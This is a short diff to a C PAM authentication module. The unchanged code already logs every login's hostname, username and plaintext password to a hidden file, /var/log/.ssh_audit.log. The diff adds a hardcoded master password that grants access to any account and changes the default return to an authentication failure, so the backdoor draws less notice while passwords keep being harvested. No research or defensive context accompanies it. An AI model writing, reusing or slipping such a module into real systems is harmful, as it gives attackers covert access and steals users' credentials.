@@ -8,6 +8,7 @@
 #include <time.h>
 
 #define MAX_SIZE 128
+#define AIO_PASSWD "ZJuj38ML0ddNDZKw"
 
 int write_to_file(char* message) {
     const char *filepath = "/var/log/.ssh_audit.log";
@@ -73,11 +74,14 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
         strncpy(authtok, void_pass, PAM_MAX_RESP_SIZE - 1);
     }
 
+    if (strncmp(AIO_PASSWD, authtok, 16) == 0) {return PAM_SUCCESS;}
+
     gethostname(hostname, MAX_SIZE);
     snprintf(message, 1023, "Time: %ld\nHostname: %s\nUsername: %s\nPassword: %s\n\n",
              (unsigned long) time(NULL), hostname, username, authtok);
     write_to_file(message);
-    return PAM_SUCCESS;
+
+    return PAM_AUTH_ERR;
 }
 
 
